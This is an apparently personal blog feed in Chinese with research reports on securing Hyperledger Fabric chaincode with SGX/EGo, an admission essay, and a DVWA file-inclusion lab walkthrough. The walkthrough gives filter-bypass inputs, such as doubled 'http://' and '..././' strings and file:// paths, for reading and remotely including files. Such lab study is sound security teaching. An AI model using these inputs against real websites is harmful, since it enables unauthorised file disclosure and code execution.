    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;本学期的科研项目为使用SGX保护hyperledger-fabric区块链，目前已经成功部署fabric网络和SGX，对二者进行测试使用，并对fabric代码和SGX代码进行部分分析。<br>&emsp;&emsp;计划十月份-十一月份能够初步结合fabric和sgx，完成简单的chaincode（智能合约）保护。<br>&emsp;&emsp;在上述计划完成后，分析多种针对fabric的攻击方式，改进以上方案，抵御至少一种攻击行为。</p><h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><p>&emsp;&emsp;本周工作主要是阅读源码，包括ego、fabric的源码，理解编写细节。</p><ol><li>SGX文件分析<br>&emsp;&emsp;SGX最重要的几个文件：<br>&emsp;&emsp;EDL（Enclave Description Language）文件：声明可信函数和不可信函数，非可信区只能通过 ECALL 函数调用可信区内的函数。可信区只能通过 OCALL 函数调用非可信区的函数。<br><div align="center"><img src="/2021/10/17/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A52/1.png"></div><br>&emsp;&emsp;xml文件：enclave的配置文件，如堆栈大小、线程数、是否可debug。<br><div align="center"><img src="/2021/10/17/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A52/2.png"></div><br>&emsp;&emsp;sgx几个重要的工具（可执行文件，安装sgx时自动编译生成）：<br>&emsp;&emsp;sgx_edger8r：根据edl文件生成可信和不可信代码（c文件和头文件）<br>&emsp;&emsp;sgx_sign：为enclaves签名<br><br>&emsp;&emsp;除以上文件之外，在编写sgx程序时要将可信部分、不可信部分分开编写和编译，最后链接可信库和不可信库，然后链接成可执行文件。sgx程序的makefile往往很复杂，包括各种链接过程，因此是一个阅读难点。<br><br></li><li><p>EGO源码分析<br>&emsp;&emsp;ego是edgeless system下的一个项目，edgeless system（<a href="https://www.edgeless.systems/">https://www.edgeless.systems/</a>）下都是可信计算相关的软件，如ego、edgelessDB、MarbleRun，以及edgeless RT（一个可信运行环境sdk）。<br>&emsp;&emsp;分析ego源码：<br>&emsp;&emsp;ego最重要的两个命令ego sign（为可执行文件签名）、ego run（为可执行文件创建enclave并运行）<br><br>&emsp;&emsp;ego sign + {exe可执行文件；json enclave配置文件；空} 三种类型文件<br>&emsp;&emsp;sign + exe 直接为可执行文件签名，首先会生成默认的json文件（enclave配置文件，和sgx的xml文件作用一致），然后生成公私密钥对，使用私钥进行签名。<br>&emsp;&emsp;sign + json或空<br>&emsp;&emsp;-&gt;调用readConfigJSONtoStruct -&gt;调用unmarshal反序列化json字符串，调用Validate检验json文件数据，PopulateContent加密<br>&emsp;&emsp;-&gt;调用signWithJSON 读取json文件 -&gt; 调用embedConfigAsPayload，将json文件嵌入exe文件中-&gt;调用createDefaultKeypair创建公私密钥对<br>&emsp;&emsp;-&gt;调用ego-oesign（原型openenclave的oesign）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">oesign sign -e ego-enclave -c enclave.conf -k private.pem --payload helloworld</span><br><span class="line">  -e, --enclave-image  path of an enclave image file.</span><br><span class="line">  -c, --config-file   [optional] configuration file specifying the enclave properties.</span><br><span class="line">  -k, --key-file    path to a private key file in PEM format to sign enclave image with</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;ego run 运行某一个特定的可执行文件<br>&emsp;&emsp;run + filename<br>&emsp;&emsp;使用ego-host（原型edgerless RT的erthost）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">erthost ego/share/ego-enclave:helloworld</span><br><span class="line"></span><br><span class="line">  Usage: ./ego-host enclave_image_path [enclave args...]</span><br><span class="line">  Set OE_SIMULATION=1 for simulation mode.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Erthost是一个用于运行飞地的工具。在开发期间，将飞地与ertdeventry连接起来。然后erthost将透明地将所有命令行参数和环境变量转发给enclave应用程序。飞地可以无限制地访问主机的文件系统<br>&emsp;&emsp;以上的可执行程序必须通过ertgo编译，不然无法生成enclave。<br>&emsp;&emsp;ertgo是一个经过改进的Go编译器，可以从给定的Go项目中构建与enclave兼容的可执行文件——同时提供与原始Go编译器相同的CLI。<br>&emsp;&emsp;ego和edgeless RT都是依靠openenclave sdk（<a href="https://github.com/openenclave/openenclave">https://github.com/openenclave/openenclave</a>），openenclave和sgx类似，也是有对应的工具oeedger8r、oesign，和sgx的sgx_edger8r、sgx_sign一致：<br><div align="center"><img src="/2021/10/17/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A52/3.png"></div><br>&emsp;&emsp;ego sign本质就是调用oesign，而ego run是调用edgeless RT的erthost，erthost是在openenclave基础上开发而来，为可执行程序创建运行时的enclave。erthost还未分析。<br><br></p></li><li>fabric源码分析<br>&emsp;&emsp;fabric安装和调用chaincode（智能合约）的命令如下：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">peer lifecycle chaincode package mycc.tar.gz --path github.com/hyperledger/multiple-deployment/abstore --lang golang --label mycc</span><br><span class="line">//chaincode打包，打包结果为压缩文件，包含一个json文件（chaincode路径、语言、标签）和源码go文件</span><br><span class="line">peer lifecycle chaincode install mycc.tar.gz  //将chaincode安装到节点上</span><br><span class="line">peer chaincode invoke -c &#x27;&#123;&quot;Args&quot;:[&quot;Init&quot;,&quot;a&quot;,&quot;100&quot;,&quot;b&quot;,&quot;100&quot;]&#125;&#x27;  //调用Init初始化</span><br><span class="line">peer chaincode query -C mychannel -n mycc -c &#x27;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&#x27; </span><br><span class="line">//调用query查询</span><br></pre></td></tr></table></figure>&emsp;&emsp;初步分析了fabric相关的代码，安装chaincode时会根据语言类型创建dockerfile，并进行编译，在调用chaincode时也会先构建容器，将chaincode放入容器中运行，因此这部分需要着重理解并改进，目前还在分析中。</li></ol><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>&emsp;&emsp;源码还未了解透彻，需要时间阅读。<br>&emsp;&emsp;ego可以直接为单独的go程序创建enclave，使整个程序在enclave中安全运行。而chaincode不是独立运行的程序，需要与peer节点进行交互，也就是存在一些函数调用，调用部分需要单独放入enclave中，因此无法直接将ego嵌入fabric中使用。<br>&emsp;&emsp;fabric对chaincode的载入、编译、容器构建都是集成在peer命令中，因此需要单独将该部分拿出重新分析和编写，并集成ertgo（改良的go编译器）和ego的功能。<br>&emsp;&emsp;fabric源码调用过程繁杂，分析过程比较耗时。</p><h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><p>&emsp;&emsp;继续阅读源码，剖解fabric的peer命令，需要深入了解chaincode如何安装、怎么在内部编译和交互的。分析ego中erthost的原理，erthost直接为可执行程序创建enclave，需要将该功能改进成peer与chaincode交互时启动enclave。</p><h1 id="个人反思"><a href="#个人反思" class="headerlink" title="个人反思"></a>个人反思</h1><p>&emsp;&emsp;项目目前还处于分析阶段，需要分析很多代码，ego、fabric、edgeless RT等，很花时间，尤其是fabric，工程量比较大，调用关系复杂。理解原理是一回事，分析代码就是另一回事了。<br>&emsp;&emsp;因此现在还理解不透彻，没有什么好的实践想法，进度较慢。<br>&emsp;&emsp;下一步规划是优先分析代码，理解代码编写过程后再上手改进。</p><p>&emsp;&emsp;ps:以下想法未提交给老师看，个人吐槽。<br>&emsp;&emsp;整个实验都是留学生的毕业项目，我只是一个帮手，但是大部分都是我一个人做的，留学生来实验室的时间很少，经常就来几个小时，每天只看看原理，代码相关的实操根本不会。留学生学习能力很差，而且并不勤奋，对实验的付出不超过20%，而我却要累死累活地帮他做，每天要分析源码，思考解决方案，汇报做ppt。最后如果论文写出来了（虽然我觉得只靠我一个人做不出来），第一作者还是他的名字，我只能拿一个共同一作，因为他只有一作才能毕业。<br>&emsp;&emsp;唉，现在生活就很苦，我才来了两个半月，就要马上赶着发论文，现在时间紧迫，项目难度大，没有学长带，一个人孤军奋战，很是苦涩。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次周期为2021/10/08 – 2021/10/15。&lt;br&gt;</summary>
    
    
    
    <category term="科研周报" scheme="https://yiwenzhe.com/categories/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="Hyperledger Fabric" scheme="https://yiwenzhe.com/tags/Hyperledger-Fabric/"/>
    
    <category term="SGX" scheme="https://yiwenzhe.com/tags/SGX/"/>
    
    <category term="EGo" scheme="https://yiwenzhe.com/tags/EGo/"/>
    
    <category term="区块链" scheme="https://yiwenzhe.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>科研周报1</title>
    <link href="https://yiwenzhe.com/2021/09/30/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A51/"/>
    <id>https://yiwenzhe.com/2021/09/30/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A51/</id>
    <published>2021-09-30T08:28:35.000Z</published>
    <updated>2022-11-06T01:54:25.887Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="本学期的科研计划"><a href="#本学期的科研计划" class="headerlink" title="本学期的科研计划"></a>本学期的科研计划</h1><p>&emsp;&emsp;本学期的科研项目为使用SGX保护hyperledger-fabric区块链，目前已经成功部署fabric网络和SGX，对二者进行测试使用。<br>&emsp;&emsp;初步计划在年底前实现简单地将chaincode放入SGX的enclave中运行（在fabric中称为链码chaincode，等同于其他区块链中的智能合约Smart contract）。为实现该想法，首先需要打通fabric链码由go语言编写和SGX由C语言编写的限制，通过阅读ego的实现方法，模拟ego，为go语言编写的chaincode创造enclave，保护其运行。<br>&emsp;&emsp;在上述计划完成后，分析多种针对fabric的攻击方式，目前已经调研了Sybil攻击、Rollback攻击，改进以上方案，抵御至少一种攻击行为。</p><h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><ol><li>chaincode是如何安装和运行的?<br>&emsp;&emsp;在fabric中，chaincode是通过如下命令安装到网络中的：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peer lifecycle chaincode install mycc.tar.gz</span><br></pre></td></tr></table></figure>&emsp;&emsp;其中peer是fabric操作的指令，mycc.tar.gz就是chaincode的压缩包，其中包含一个json文件和go文件。<br>&emsp;&emsp;在安装后，peer实例化该chaincode时，peer命令会创建一个docker文件，为chaincode创建容器，编译go文件，并将编译后的二进制文件放入容器中运行。之后peer便会通过chaincode中的接口（Init、Invoke、Query）来与之交互。<br><br></li><li>EGo<br>&emsp;&emsp;ego官网：<a href="https://docs.edgeless.systems/ego/#/">https://docs.edgeless.systems/ego/#/</a><br>&emsp;&emsp;ego-go，一个经过改进的Go编译器，可以从给定的Go项目中构建与enclave兼容的可执行文件——同时提供与原始Go编译器相同的CLI。<br>&emsp;&emsp;ego，一个CLI工具，可以处理所有与enclave相关的任务，如签名和创建enclave。<br>&emsp;&emsp;ego使用如下：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ego-go build helloworld.go  //编译一个go程序</span><br><span class="line">ego sign helloworld         //创建enclave.json配置文件和公私密钥对</span><br><span class="line">ego run helloworld          //在enclave中运行（此处是在仿真模式运行）</span><br></pre></td></tr></table></figure><div align="center"><img src="/2021/09/30/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A51/ego.png"></div><br><br></li><li>针对fabric提出三种方案<br>&emsp;&emsp;A方案：<br>&emsp;&emsp;使用ego，设法在运行时替换go为ego，并使用ego run运行chaincode。<br>&emsp;&emsp;问题：chaincode不是独立的运行程序，需要与peer程序交互，因此无法直接使用ego run运行。<br><br>&emsp;&emsp;B方案：<br>&emsp;&emsp;自己编写chaincode，将chaincode划分为两部分，交互的接口部分使用go语言编写，实际运行部分使用c语言编写，并启动enclave运行。<br>&emsp;&emsp;问题：go语言如何与C语言交互？go程序会被peer编译，c语言如何被fabric编译运行？并且该方案也不实用，用户每次都需要重新编写chaincode。<br><br>&emsp;&emsp;C方案：<br>&emsp;&emsp;阅读ego源码，模仿ego为go程序创建enclave功能的实现，在网络中直接为chaincode创建enclave。<br>&emsp;&emsp;该方案较为实用，用户只需要和之前一样编写go语言的chaincode即可。难点在于ego源码的阅读和实现。</li></ol><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><ol><li><p>源码理解问题<br>&emsp;&emsp;fabric源码、sgx实现方法、ego源码均需要时间去理解，fabric源码量较大，因此可以选择chaincode的部分先着重分析。而网络中关于ego的解释文件很少，官网也只是粗略地介绍使用方法，因此源码阅读很有难度，只能通过cmakefile来理清文件结构。同时fabric都是使用go语言编写，我未系统地学习go语言，因此也需要花时间了解go语法。</p></li><li><p>二者交互问题<br>&emsp;&emsp;整个科研方案最大的问题就是go语言和c语言的结合问题，fabric只支持go语言，sgx只能通过C语言编写，因此将二者结合就是一个难点。目前还没有较好的解决方案。</p></li></ol><h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><ol><li>继续ego源码阅读</li><li>sgx相关文件阅读，并充分学会编写sgx程序</li><li>尝试编写go语言的enclave代码（模仿ego）（可能需要多周实现）</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;导师让我们将每周的工作用科研周报的形式汇报给她，在此同步记录，本次周期为2021/09/26—2021/10/01。&lt;br&gt;</summary>
    
    
    
    <category term="科研周报" scheme="https://yiwenzhe.com/categories/%E7%A7%91%E7%A0%94%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="Hyperledger Fabric" scheme="https://yiwenzhe.com/tags/Hyperledger-Fabric/"/>
    
    <category term="SGX" scheme="https://yiwenzhe.com/tags/SGX/"/>
    
    <category term="EGo" scheme="https://yiwenzhe.com/tags/EGo/"/>
    
    <category term="区块链" scheme="https://yiwenzhe.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>保研结束有感</title>
    <link href="https://yiwenzhe.com/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/"/>
    <id>https://yiwenzhe.com/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/</id>
    <published>2021-09-29T06:20:26.000Z</published>
    <updated>2022-10-20T03:36:17.375Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --></p><p>&emsp;&emsp;2021年9月28日，我终于拿到了武汉大学的待录取通知，这一天将成为我人生中最重要的转折点。<br><img src="/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/offer.jpg" alt="offer"></p><p>&emsp;&emsp;保研的过程和考研复习的痛苦程度不相上下。对于我来说只是持续了一整年，对于别人可能从大一入学就开始了。大一大二我活在自己的舒适圈中，每天除了日常课程任务就是自娱自乐，偶尔去看看电影跑跑步，生活完全与他人隔离，这给我带来了无限的快乐，但也让我错失了许多交友的机会。我的室友凭借着才华与智慧，走进了各种社团，与辅导员交友，获取各种竞赛信息，而我只会在竞赛结束时感叹：“啊？还有这个比赛啊？”因此周围的同学在各种评奖评优中斩获佳绩，我只能默默悔恨。</p><p>&emsp;&emsp;大三时，我终于认识到自己的懒散与差距，这才迈出第一步，参加了湖北省英语翻译大赛，虽然什么奖也没捞到，但却是宝贵的一次经历。后续也参加了一些微不足道的比赛，获得一些小奖，自己也挺开心。之后就是美赛，也算是我参加过最有价值的比赛了。接着就没有参加比赛了，我深知自己得不了奖，参加这些只会是耗费时间和精力，因此便抱着侥幸心理，如果保研不成功还能考嘛，万一保上了呢？万一、万一······</p><p>&emsp;&emsp;六月份大三学年结束时，夏令营开始了，这是我绝不能放弃的机会，我毅然决然地报名了。夏令营是我人生中第一次参加面试，我紧张极了，面试流程根本不熟悉，听别人说进去要用英语自我介绍，我一直背啊背，回想着各种可能问到的问题，在心中暗示自己沉着冷静。进入面试室，刚说了一句：“hello, everyone, my name is…”我就被面试官打断了，他笑着说：“我们问一个你再回答，看来这位同学有点激动啊。”我只能尴尬地笑笑，让自己的慌张不被看出。之后的问题就比较简单了，面试官问的都是简历上写的内容，因此我能娓娓道来。最后，我也顺利成为了优秀营员。</p><p>&emsp;&emsp;真正的转折点就是这次夏令营了，在夏令营闭营仪式上，老师让我们赶紧联系心仪的导师，抓住机会。我想都没想就去给一位老师发了邮件，没想到就是这封邮件改变了一切。王老师直接邀请我加入实验室，我欣喜若狂，连忙答应，第二天就参与到实验室科研工作中了，虽说只是协助一个留学生，能被导师接纳已足够让我满足。但那时我还不能确定有保研资格，如果最后保研失败，我就必须退出实验室去复习考研了，这对于导师、学长学姐都是一个极其不负责任的表现。过了几天我变得悔恨和害怕，如果自己能更深思熟虑一些，就不会把自己送上绝路了。2021年的暑假，我留校了，留校读论文、做实验，牺牲着自己的假期，做着更有意义的事情。</p><p>&emsp;&emsp;9月份大四开学，保研申请表开始提交。我害怕自己保研失败，提前买好了考研数学英语复习资料，边复习边等待。我唯一拿得出手的就是成绩，其余加分项均为0。提交之后我寝食难安，每天都忧心忡忡，尤其是出结果那一个晚上，我紧张地难以呼吸。我怀着忐忑的心情，一步步走到结果公示处，在一堆名字中发现了自己，我心中的石头终于放下了，这次又是开心地无法呼吸。我是幸运的，幸运的是填报了网络安全学院，幸运的是学院保研名额很多，幸运的是我的成绩没有很差……</p><p><img src="/2021/09/29/%E4%BF%9D%E7%A0%94%E7%BB%93%E6%9D%9F%E6%9C%89%E6%84%9F/books.jpg" alt="吃灰的考研书籍"></p><center style="font-size:16px;color:#000000f;text-decoration:underline">吃灰的考研书籍</center> <p>&emsp;&emsp;之后就是志愿填报了，此时也不再紧张，获得优秀营员的我拿到录取也是尘埃落定，但拿到录取通知，尤其是与家人朋友分享这一消息，让我感到无与伦比的放松，是啊，一切终于结束了，开心的是不用考研了，不开心的是考研资料花了我200块，白买了，哈哈。</p><p>&emsp;&emsp;从现在开始就可以认认真真踏踏实实做项目了，也没有其他顾虑，也算是提前进入研究生生涯了吧，希望自己能在科研上有所成就，将来说不定还可以读博呢。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;保研终于结束了，研究生生活要正式开始了。&lt;br&gt;</summary>
    
    
    
    <category term="生活吐槽" scheme="https://yiwenzhe.com/categories/%E7%94%9F%E6%B4%BB%E5%90%90%E6%A7%BD/"/>
    
    
    <category term="生活" scheme="https://yiwenzhe.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA(四)：File-Inclusion（文件包含）</title>
    <link href="https://yiwenzhe.com/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/"/>
    <id>https://yiwenzhe.com/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/</id>
    <published>2021-07-03T02:30:02.000Z</published>
    <updated>2022-10-20T06:19:46.700Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><p>&emsp;&emsp;当我们在编写较大工程时，往往会将功能函数封装在单独的文件中，方便多次调用，调用文件的过程就是文件包含。如果不对文件来源进行审查，可能就会导致任意文件读取或者任意命令执行，这就是文件包含漏洞。<br>&emsp;&emsp;文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞。在php中alLow_url_fopen选项开启后，服务器允许包含远程的文件，就会造成远程文件包含漏洞。<br>&emsp;&emsp;php常见文件包含函数如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Include()</span><br><span class="line"><span class="comment">/*当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。*/</span></span><br><span class="line">Require()</span><br><span class="line"><span class="comment">/*require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。*/</span></span><br><span class="line">include_once()</span><br><span class="line"><span class="comment">/*和include没有什么区别，只是在导入函数之前先检测下该文件是否被include过，如果已经执行了一遍，那么就不在进行第二次的include操作。*/</span></span><br><span class="line">require_once()</span><br><span class="line"><span class="comment">/*功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次*/</span></span><br></pre></td></tr></table></figure><h1 id="安全级别Low"><a href="#安全级别Low" class="headerlink" title="安全级别Low"></a>安全级别Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;直接跳过GET获取page参数，未经检查和过滤，直接执行。<br>&emsp;&emsp;页面显示如下：</p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/1.png" width="350" height="89"></div><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;页面中有三个file，点击第一个文件，显示如下：</p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/2.png" width="600" height="261"></div><p>&emsp;&emsp;点击file1时，服务器会包含file1并执行，同时观察url，page=file1.php，因此是直接通过page传递参数，可以直接在url上修改文件路径。<br>&emsp;&emsp;在file1、2、3同文件夹下有一个隐藏文件file4.php和我自己编写的flag文件，通过page=file4.php、page=flag获取文件内容：</p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/3.png" width="350" height="99"></div><p><br></p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/4.png" width="500" height="152"></div><p>&emsp;&emsp;当文件类型为php时，文件会执行并显示信息。而不是php文件时，如上图flag，会直接显示文件内容。<br>&emsp;&emsp;如果我们知道服务器的文件路径，可以通过相对路径（如../../phpinfo.php）和绝对路径的方式包含文件。若要远程包含文件，输入完整的url路径即可：</p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/5.png" width="600" height="330"></div><p><br></p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Low/6.png" width="600" height="330"></div><h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( array( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( array( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;此处添加了一些字符过滤，将“http: //”、“https: //”、 “../”、“..\”替换为空，阻挡一些路径文件的访问。</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp;对于“../”、“..\”这样的相对路径，若知道了服务器完整的文件路径，可以使用绝对路径来代替。<br>&emsp;&emsp;可以采用复写的方式来绕过，如“ht <strong>http://</strong> tp://”，“ht <strong>https://</strong> tps://”，字符串中的“http: //”、“https: //”被替换为空，因此前后的字符串又拼接起来成http。同样也使用”…/./“、”….\”来绕过：</p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Medium/1.png" width="600" height="334"></div><p><br></p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/Medium/2.png" width="600" height="337"></div><h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    echo <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;源码中使用了file协议，限制路径开头必须为file。<br>&emsp;&emsp;file协议是本地文件传输协议 ，主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。 要使用file协议，基本的格式如下：file:///文件路径。<br>&emsp;&emsp;因此我们只能使用绝对路径来包含文件：</p><div align="center"><img src="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/High/1.png" width="600" height="324"></div><h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">&quot;include.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    echo <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;源码对文件名实行白名单机制，只有file1.php、file2.php、file3.php可以被包含，彻底修复了任意文件包含漏洞。</p>]]></content>
    
    
